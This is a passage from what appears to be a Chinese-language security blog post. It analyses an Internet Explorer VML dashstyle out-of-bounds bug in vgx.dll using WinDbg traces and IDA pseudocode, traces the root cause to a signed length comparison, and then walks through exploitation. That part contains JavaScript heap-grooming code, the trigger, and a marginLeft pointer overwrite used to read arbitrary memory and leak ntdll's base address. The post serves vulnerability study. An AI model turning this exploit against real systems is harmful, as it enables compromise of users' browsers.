0000001c</span><br><span class="line">1a53efc0  0000001d 0000001e 0000001f 00000020</span><br><span class="line">1a53efd0  00000021 00000022 00000023 00000024</span><br><span class="line">1a53efe0  00000025 00000026 00000027 00000028</span><br><span class="line">1a53eff0  00000029 0000002a 0000002b 0000002c</span><br><span class="line">1a53f000  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f010  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f020  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f030  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f040  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f050  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f060  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f070  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f080  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f090  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p></p><p>可以注意到在所访问的非法内存前面，存在一串极其规律的数字，结合POC中的代码，我们发现这应该是dashstyle属性的值，这是一个数组，其中每个元素大小为4字节。<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br></pre></td></tr></table></figure><p></p><p>继续结合POC，发现下面这句对dashstyle数组的访问应该就是造成crash的原因了<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">marginLeftAddress = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br></pre></td></tr></table></figure><p></p><p>其中<code>0x2E+0x16</code>正好是访问的非法内存地址相对于数组的偏移。这意味着，我们拥有了数组越界访问的能力。<br>但是，漏洞的成因我们还是不得而知，观察函数调用栈，向上回溯到vgx!ORG::Get，在函数开始处下上断点。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:015&gt; bp vgx!ORG::Get</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=1b570fe8 ebx=70a84964 ecx=70a17258 edx=0449bfb4 esi=1b778ff0 edi=0449c55c</span><br><span class="line">eip=70a2cf82 esp=0449bf90 ebp=0449bfb8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!ORG::Get:</span><br><span class="line">70a2cf82 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd esp l4</span><br><span class="line">0449bf90  70a7da0f 1b570fe8 0449bfb4 00000044</span><br><span class="line">0:005&gt; dd 1b570fe8 l8                               </span><br><span class="line">1b570fe8  70a17258 002cffff 00040004 00000101</span><br><span class="line">1b570ff8  1a7dcf50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; ln 70a17258                                  //查看对象虚表</span><br><span class="line">(70a17258)   vgx!ORG::`vftable&apos;   |  (70a172e8)   vgx!vrgopNinch</span><br><span class="line">Exact matches:</span><br><span class="line">    vgx!ORG::`vftable&apos; = &lt;no type information</span><br></pre></td></tr></table></figure><p></p><p>配合IDA查看该函数结构<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__stdcall ORG::Get(<span class="keyword">int</span> a1, <span class="keyword">void</span> *Dst, <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Dst )</span><br><span class="line">    result = <span class="built_in">memcpy</span>(Dst, (*(a1 + <span class="number">16</span>) + a3 * (*(a1 + <span class="number">8</span>) &amp; <span class="number">0xFFFF</span>)), *(a1 + <span class="number">8</span>) &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>根据第一个参数的虚表指针可以知道到，<code>a1</code>是一个<code>vgx!ORG</code>对象，<code>*(a1+16)</code>是<code>dashstyle</code>数组的起始地址。从而可以得知，<code>dashstyle</code>属性是靠<code>vgx!ORG</code>对象进行管理的。<br>第三个参数<code>a3</code>则是所访问的元素的偏移，正好是<code>0x2e+0x16=0x44</code></p><p>然而，按照程序执行正常流程来说，是不应该调用到这个函数的，越界访问应该提前被检查到，所以我们还需要继续向前回溯，在<code>vgx!COALineDashStyleArray::get_item</code>处下断点，同时配合IDA。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __stdcall COALineDashStyleArray::get_item(struct COAProg **<span class="keyword">this</span>, <span class="keyword">signed</span> <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">COAProg</span> **<span class="title">v3</span>;</span> <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">COAProg</span> *<span class="title">v6</span>;</span> <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> ( a2 &lt;= <span class="number">-1</span> || (v8 = (*(*<span class="keyword">this</span> + <span class="number">11</span>))(<span class="keyword">this</span>), a2 &gt;= v8) )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">0x80048230</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        (*(*<span class="keyword">this</span> + <span class="number">7</span>))(<span class="keyword">this</span>, &amp;v10, a2); <span class="comment">//vgx!ORG::Get</span></span><br><span class="line">        *a3 = v10;</span><br><span class="line">      &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">0:015&gt; bp vgx!COALineDashStyleArray::get_item</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=0000000a ebx=70a84964 ecx=70a7d983 edx=184eaff2 esi=018baea0 edi=0473c2f4</span><br><span class="line">eip=70a7d983 esp=0473bd54 ebp=0473bd70 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vgx!COALineDashStyleArray::get_item:</span><br><span class="line">70a7d983 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd esp l4</span><br><span class="line">0473bd54  764a3ec3 1b398ff0 00000044 0473bdb4</span><br></pre></td></tr></table></figure><p>通过调试，确定ida代码中调用的两个函数指针分别为<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = (*(*<span class="keyword">this</span> + <span class="number">11</span>))(<span class="keyword">this</span>)      <span class="comment">//vgx!ORG::CElements()</span></span><br><span class="line">(*(*<span class="keyword">this</span> + <span class="number">7</span>))(<span class="keyword">this</span>, &amp;v10, a2); <span class="comment">//vgx!ORG::Get(int a1, void *Dst, int a3)</span></span><br></pre></td></tr></table></figure><p></p><p>观察参数可以知道，<code>a2</code>是将要访问的偏移。<br>注意到在IDA中的if判断，首先调用了<code>ORG::CElements</code>，若其返回值小于<code>a2</code>，则执行<code>vgx!ORG::Get</code>函数<br>直觉告诉我们这里便是一个关键点所在，我们跟进<code>ORG::CElements</code>函数查看细节。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vgx!ORG::CElements:</span><br><span class="line">70a2d079 8bff            mov     edi,edi</span><br><span class="line">70a2d07b 55              push    ebp</span><br><span class="line">70a2d07c 8bec            mov     ebp,esp</span><br><span class="line">70a2d07e 8b4508          mov     eax,dword ptr [ebp+8]</span><br><span class="line">70a2d081 0fb74004        movzx   eax,word ptr [eax+4]</span><br><span class="line">70a2d085 5d              pop     ebp</span><br><span class="line">70a2d086 c20400          ret     4</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0:005&gt; g</span><br><span class="line">eax=1b190fe8 ebx=70a84964 ecx=70a17258 edx=0473bd24 esi=1b398ff0 edi=0473c2f4</span><br><span class="line">eip=70a2d07e esp=0473bd2c ebp=0473bd2c iopl=0         nv up ei pl nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213</span><br><span class="line">vgx!ORG::CElements+0x5:</span><br><span class="line">70a2d07e 8b4508          mov     eax,dword ptr [ebp+8] ss:0023:0473bd34=1b190fe8</span><br><span class="line">0:005&gt; dd 1b190fe8 l8</span><br><span class="line">1b190fe8  70a17258 002cffff 00040004 00000101</span><br><span class="line">1b190ff8  1a3fcf50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=1b190fe8 ebx=70a84964 ecx=70a17258 edx=0473bd24 esi=1b398ff0 edi=0473c2f4</span><br><span class="line">eip=70a2d081 esp=0473bd2c ebp=0473bd2c iopl=0         nv up ei pl nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213</span><br><span class="line">vgx!ORG::CElements+0x8:</span><br><span class="line">70a2d081 0fb74004        movzx   eax,word ptr [eax+4]     ds:0023:1b190fec=ffff</span><br></pre></td></tr></table></figure><p></p><p>可以看到，代码从一个<code>vgx!ORG</code>对象中取出了<code>0xffff</code>，其中<code>movzx</code>说明是将其作为无符号数对待的。<br>当函数返回后，<code>0xffff</code>将会和<code>a2</code>进行比较，但此时是有符号数比较，导致<code>0xffff &lt; a2</code>，从而调用<code>vgx!ORG::Get</code></p><p>根据POC中的代码，我们很容易猜到<code>0xffff</code>就是dashstyle数组（ORG数组）的长度，而<code>vml1.dashstyle.array.length = 0 - 1;</code>就是对长度进行修改的代码。</p><p>此时我们已经大概了解的这个漏洞的原理，但还是没有追溯到修改数组长度的根源。接下来我们将要试图找到修改length的具体代码。</p><h2 id="漏洞根源"><a href="#漏洞根源" class="headerlink" title="漏洞根源"></a>漏洞根源</h2><p>因为在c++在创建对象的时候，会将对象的虚表地址拷贝到对象的内存中，所以我们在代码中搜索对<code>vgx!ORG::&#39;vftable&#39;</code>的引用，试图找到创建<code>vgx!ORG</code>对象的代码。<br><img src="/post/ef2727d8/search1.png" alt="search1.png"><br><img src="/post/ef2727d8/search2.png" alt="search2.png"><br>可以看到，除了虚表本身以及两个<code>ORG</code>对象的成员函数外，只剩一个函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">MsoFCreateArray</span><span class="params">(__int16 a1, _DWORD *a2)</span></span>;</span><br></pre></td></tr></table></figure><p></p><p>在windbg中对其下断点<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; bp vgx!MsoFCreateArray</span><br><span class="line">0:016&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=0485e9c8 ebx=0485ea30 ecx=0485ea30 edx=00000001 esi=0485ea34 edi=0485ea30</span><br><span class="line">eip=6e90d1df esp=0485e99c ebp=0485e9b0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!MsoFCreateArray:</span><br><span class="line">6e90d1df 8bff            mov     edi,edi</span><br><span class="line">...                                      //单步几次后</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=0485e9c8 ebx=0485ea30 ecx=0485ea30 edx=00000001 esi=0485ea34 edi=00000101</span><br><span class="line">eip=6e90d1ee esp=0485e988 ebp=0485e998 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!MsoFCreateArray+0xf:</span><br><span class="line">6e90d1ee e88a67fdff      call    vgx!operator new (6e8e397d)</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=1d66efe8 ebx=0485ea30 ecx=00000014 edx=00000000 esi=0485ea34 edi=00000101</span><br><span class="line">eip=6e90d1f3 esp=0485e988 ebp=0485e998 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vgx!MsoFCreateArray+0x14:</span><br><span class="line">6e90d1f3 59              pop     ecx</span><br><span class="line">0:005&gt; dd eax l8</span><br><span class="line">1d66efe8  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">1d66eff8  c0c0c0c0 d0d0d0d0 ???????? ????????</span><br></pre></td></tr></table></figure><p></p><p>可以发现这里创建了一个<code>vgx!ORG</code>对象，我们对它的length所在地址下内存断点，来观察其值的变化。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; ba w2 eax+4</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">eax=1d66efec ebx=0485ea30 ecx=00000000 edx=00000004 esi=1d66efe8 edi=00000101</span><br><span class="line">eip=6e94c07e esp=0485e978 ebp=0485e978 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!MsoFInitPx+0x11:</span><br><span class="line">6e94c07e 8b4d14          mov     ecx,dword ptr [ebp+14h] ss:0023:0485e98c=00000101</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 00040001 00040004 00000101</span><br><span class="line">1d66eff8  1d670ff0 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 00040002 00040004 00000101</span><br><span class="line">1d66eff8  1d670ff0 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 00040003 00040004 00000101</span><br><span class="line">1d66eff8  1d670ff0 d0d0d0d0 ???????? ????????</span><br><span class="line">...</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 002c002c 00040004 00000101</span><br><span class="line">1d66eff8  1cbe2f50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 002cffff 00040004 00000101</span><br><span class="line">1d66eff8  1cbe2f50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0485ee34 6e94c7c6 1d66efec ffffffff 0000002d vgx!MsoFRemovePx+0xaa</span><br><span class="line">0485ee4c 6e90cf79 1d66efec ffffffff 0000002d vgx!MsoDeletePx+0x15</span><br><span class="line">0485ee60 6e95dbac 1d66efe8 ffffffff 0000002d vgx!ORG::DeleteRange+0x17</span><br><span class="line">0485ee8c 764a3ec3 1d66efe8 ffffffff 0793efa4 vgx!COALineDashStyleArray::put_length+0xd7</span><br><span class="line">0485eea8 764a3d3d 1d896ff0 00000030 00000004 OLEAUT32!DispCallFunc+0x165</span><br><span class="line">0485ef38 6e9447c1 07e4b454 1d896ff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x23f</span><br></pre></td></tr></table></figure><p></p><p>可以看到，length的值首先从<code>0</code>递增到<code>0x2c</code>，然后被修改为了<code>0xffff</code><br>通过栈回溯可以注意到<code>vgx!COALineDashStyleArray::put_length</code>函数，从函数名就可以猜测到这是一个修改length值的函数。<br>重新运行，对该函数下断<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:015&gt; bp vgx!COALineDashStyleArray::put_length</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=0000000a ebx=70a84964 ecx=70a7dad5 edx=09648fea esi=06297ec0 edi=046deca4</span><br><span class="line">eip=70a7dad5 esp=046dec58 ebp=046dec70 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vgx!COALineDashStyleArray::put_length:</span><br><span class="line">70a7dad5 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd esp l4</span><br><span class="line">046dec58  764a3ec3 1d958ff0 ffffffff 09648fa4</span><br></pre></td></tr></table></figure><p></p><p>同时使用IDA查看函数代码<br></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __stdcall COALineDashStyleArray::put_length(struct COAProg **<span class="keyword">this</span>, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( v10 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    v7 = (*(*<span class="keyword">this</span> + <span class="number">11</span>))(<span class="keyword">this</span>);     <span class="comment">//vgx!ORG::CElements()</span></span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(*<span class="keyword">this</span> + <span class="number">10</span>))(<span class="keyword">this</span>, a2, v7 - a2);   <span class="comment">//vgx!ORG::DeleteRange(ORG *this, int a2, int a3)</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = a2 - v7;</span><br><span class="line">    v9 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">4</span> * (a2 - v7));</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">4</span> * v8);</span><br><span class="line">    <span class="keyword">if</span> ( !(*(*<span class="keyword">this</span> + <span class="number">6</span>))(<span class="keyword">this</span>, v9, v8) )    <span class="comment">//vgx!ORG::FAppendRange(int a1, void *Src, int a3)</span></span><br><span class="line">        v10 = <span class="number">0x80004005</span>;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v9)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  v3 = v10;</span><br><span class="line">  COAError::~COAError(&amp;v10);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>首先通过调试可以知道，参数a2的值为0xffffffff，也就是我们想要设置的length。ida中的几个函数指针分别为如上所示。<br>通过ida反编译的代码我们就可以将整个程序逻辑理解清楚了。</p><ol><li>首先使用<code>vgx!ORG::CElements()</code>获取当前的长度值(<code>0x2c</code>)，放入<code>v7</code>中</li><li><code>v7</code>与参数<code>a2</code>进行比较，这里同样也是有符号数的比较，<code>v7 &gt; a2</code></li><li>调用<code>ORG::DeleteRange</code>并直接跳转到<code>LABEL_2</code>，退出函数</li></ol><p>而程序的正常流程本应该为</p><ol><li><code>v7 &lt; v2</code>，</li><li>重新分配内存<code>v9 = operator new(4 * (a2 - v7))</code></li><li>调用<code>ORG::FAppendRange</code>函数，并退出函数。</li></ol><p>到此，我们完成了对poc触发crash完整流程的分析。</p><h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><blockquote><p>此时注意关闭hpa选项</p></blockquote><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>这里参考了<a href="http://www.cnblogs.com/Danny-Wei/p/3766432.html" target="_blank" rel="noopener">Danny__Wei</a>的博客</p><blockquote><ol><li><code>VML shape</code>的<code>_vgRuntimeStyle</code>属性由<code>COARuntimeStyle</code>对象负责处理，当访问<code>_vgRuntimeStyle.marginLeft</code>时，对应的<code>COARuntimeStyle::put_marginLeft()</code>或者<code>COARuntimeStyle::get_marginLeft()</code>函数就会被调用</li><li>当第一次访问<code>marginLeft/rotation</code>属性，那么在<code>put_marginLeft/put_rotation</code>函数中会调用<code>CVMLShape::GetRTSInfo -&gt; CParserTag::GetRTSInfo</code>来创建一个<code>COARuntimeStyle</code>对象，该对象大小为0xAC（实际分配0xB0）</li><li>而<code>marginLeft</code>属性的值对应的字符串指针就保存在该<code>COARuntimeStyle</code>对象的0x58偏移处。可以通过<code>get_marginLeft</code>函数来访问该属性</li></ol></blockquote><p>因为我们拥有让<code>dashstyle</code>数组（ORG数组）越界访问的能力<br>那么，如果可以将<code>COARuntimeStyle</code>对象布局到一个<code>dashstyle</code>数组后方，我们就可以修改其中的<code>marginLeft</code>值对应的字符串指针。<br>这样，当我们再次读取<code>marginLeft</code>值的时候，就可以任意地址读取了。</p><h3 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h3><p>为了达到这样的效果，我们这里首先创建大量的<code>VML shape</code>对象<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        rect_array[i]    = <span class="built_in">document</span>.createElement(<span class="string">"v:shape"</span>)</span><br><span class="line">        rect_array[i].id = <span class="string">"rect"</span> + i.toString()</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(rect_array[i])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>然后依次访问<code>_vgRuntimeStyle.rotation</code>，以此来创建大量的<code>COARuntimeStyle</code>对象(<code>0xB0字节</code>)<br>并且在创建的中途创建一个包含44个元素的<code>dashstyle数组</code>（ORG数组），该数组大小与<code>COARuntimeStyle</code>对象一致，使之可以与其相邻。<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span><br><span class="line">    a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._vgRuntimeStyle;  <span class="comment">//获取_vgRuntimeStyle属性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span><br><span class="line">    a[i].rotation;  <span class="comment">//第一次访问rotation属性，创建COARuntimeStyle对象 大小为0xAC(0xB0) 在偏移为0x58处为marginLeft</span></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;   <span class="comment">//在COARuntimeStyle中间创建一个包含44个元素的dashstyle数组（ORG数组），分配4*44 = 0xb0大小的空间</span></span><br><span class="line">    vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在布局成功后，越界访问修改<code>marginLeft</code>指针(偏移为<code>0x16*4=0x58</code>)，然后再次读取<code>marginLeft</code>，从而泄露数据。这里选择通过固定地址<code>0x7ffe0300</code>泄露出<code>ntdll.dll</code>的基址。<br>通过固定地址泄露的方法在后期补丁之后无法利用，可以选择泄露<code>COARuntimeStyle</code>对象的虚表指针从而计算出<code>vgx.dll</code>基址,然后通过读取<code>PE头</code>来获取<code>IAT</code>表来得到<code>ntdll.dll</code>的基址，具体可参考<a href="https://www.4hou.com/technology/4241.html" target="_blank" rel="noopener">文章</a><br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span 